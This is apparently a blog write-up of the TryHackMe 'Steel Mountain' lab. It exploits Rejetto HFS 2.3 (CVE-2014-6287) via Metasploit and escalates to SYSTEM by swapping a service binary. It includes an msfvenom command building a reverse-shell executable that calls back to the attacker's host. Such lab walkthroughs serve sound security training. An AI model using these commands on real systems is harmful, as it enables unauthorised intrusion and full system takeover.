---
layout: post
title: 'Steel Mountain -TryHackMe Writeup'
date: 2026-03-02 00:15:01 +0000
categories: [cybersecurity]
tags:
  - tryhackme
  - writeup
description: "Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation…"
canonical_url: "https://medium.com/@hemanthakrishnach/steel-mountain-tryhackme-writeup-c4acbb18efe2"
image: "/assets/images/posts/steel-mountain-tryhackme-writeup/img-000-29f7537e.jpg"
---

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation…

---

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-000-29f7537e.jpg)

Room link: <https://tryhackme.com/room/steelmountain>

### Introduction & Enumeration

After deploying the machine, begin with basic enumeration.

Since the machine does **not respond to ICMP**, skip ping checks and go straight to Nmap:
```bash
nmap -T4 -p- -A <MACHINE_IP>
```
![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-001-d5ae5885.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-002-7904a5d7.png)

#### 🏆 Who is the Employee of the Month?

Browse to:
```cpp
http://<TARGET_IP>/
```
![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-003-693fd059.png)

By attempting to save the image of the employee, the filename reveals the individual’s name.![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-004-e41861e1.png)

**Answer:** Bill Harper

### Initial Access

An Nmap scan reveals several open ports, including a secondary web server:

- **Port 80:** Microsoft IIS 8.5- **Port 8080:** Rejetto HTTP File Server (HFS) 2.3

Navigate to:
```cpp
http://<TARGET_IP>:8080
```

### Identifying the Vulnerability

Browsing to the web server on **port 8080** confirms it is running **Rejetto HTTP File Server 2.3**.![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-005-e11b8ae3.png)

Researching this version on Exploit-DB reveals a Remote Command Execution (RCE) vulnerability.![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-006-b363b0b5.png)

[**CVE Number:** 2014–6287](https://www.exploit-db.com/exploits/39161)

### Gaining a Shell

Using Metasploit, we can automate the exploitation of this service:

<https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/>

1. **Search and Load:** `use exploit/windows/http/rejetto_hfs_exec`- **Configure Options:** Set `RHOSTS` to the target IP and `RPORT` to 8080.- **Exploit:** Running the exploit drops us into a **Meterpreter** session.

![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-007-10678efa.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-008-f55ffda8.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-009-5f67c63e.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-010-140681ad.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-011-80ad3623.png)

From the Meterpreter shell, we navigate to Bill’s desktop to find the user flag:

- **User Flag:** Found in `C:\Users\bill\Desktop\user.txt`

![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-012-74c18d1a.png)

### Privilege Escalation

With initial access as the user `bill`, we now aim to escalate our privileges to `SYSTEM`.

#### Enumeration with PowerUp

We use the PowerShell script **PowerUp.ps1** to look for common Windows misconfigurations. After uploading the script and loading the PowerShell extension in Meterpreter , we run `Invoke-AllChecks`.![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-013-b852150f.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-014-43516add.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-015-e3602e61.png)

The scan identifies a vulnerable service where the `CanRestart` option is set to **True**.

- **Vulnerable Service:** AdvancedSystemCareService9

![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-016-02bcb76e.png)

### Exploiting Service Permissions

The service path is identified as having “Unquoted Service Paths” and, more importantly, weak file permissions. This allows us to replace the legitimate service executable with a malicious one.

- **Generate Payload:** Use `msfvenom` to create a reverse shell executable named `Advanced.exe`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-017-7c25479c.png)

- **Upload Payload:** Transfer the file to the target machine in the service’s directory.

![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-018-5d5f9ec6.png)

- **Restart Service:** Stop the legitimate service and start it again to trigger our payload.

![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-019-fd890b55.png)![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-020-73db567a.png)

### Capturing the Root Flag

Once the service restarts, it executes our malicious binary as **NT AUTHORITY\SYSTEM**. We catch the reverse shell on our listener and navigate to the Administrator’s desktop:![image](/assets/images/posts/steel-mountain-tryhackme-writeup/img-021-d03a0fcc.png)

**Root Flag:** Found in `C:\Users\Administrator\Desktop\root.txt`

### Summary

We began by scanning the target and discovered web servers on ports 80 and 8080. The service on port 8080 was identified as **Rejetto HTTP File Server**, which was vulnerable to **CVE-2014–6287**. Using Metasploit, we exploited this vulnerability to gain an initial shell as Bill and captured the user flag.

For privilege escalation, we used PowerUp to enumerate misconfigurations and found a vulnerable service with weak file permissions. By replacing the service executable with a malicious payload and restarting it, we gained SYSTEM privileges and retrieved the root flag from the Administrator account.

#### Thanks for reading!
